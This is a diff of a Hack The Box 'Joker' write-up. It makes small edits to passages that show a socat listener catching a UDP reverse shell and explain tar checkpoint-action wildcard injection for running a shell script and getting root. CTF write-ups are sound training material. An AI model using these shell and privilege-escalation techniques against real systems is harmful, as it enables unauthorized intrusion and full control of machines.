@@ -212,8 +212,6 @@ We won't be able to use netcat to catch a UDP shell so we'll have to use `socat`
 
 ```
 kali:~/htb/joker# socat file:`tty`,echo=0,raw  udp-listen:100
-werkzeug@joker:~$ 
-werkzeug@joker:~$ 
 werkzeug@joker:~$ id
 uid=1000(werkzeug) gid=1000(werkzeug) groups=1000(werkzeug)
 ```
@@ -345,7 +343,7 @@ Short explanation is we can inject options and parameters into the tar command t
 
  The options we are going to use are `--checkpoint` and `--checkpoint-action`. With tar you can specify checkpoints and a checkpoint action which will run commands at each checkpoint. So all we have to do is set a checkpoint action to run another python UDP shell.
 
-Stage our shell.
+Let's stage our shell.
 ```
 alekos@joker:~/development$ nano udpshell.py
 alekos@joker:~/development$ chmod +x udpshell.py
@@ -360,6 +358,8 @@ Fire up our socat listener and wait for the job to run.
 
 ```
 root@kali:~/htb/joker# socat file:`tty`,echo=0,raw  udp-listen:100
+root@joker:/home/alekos/development# id
+uid=0(root) gid=0(root) groups=0(root)
 root@joker:/home/alekos/development# 
 ```
 
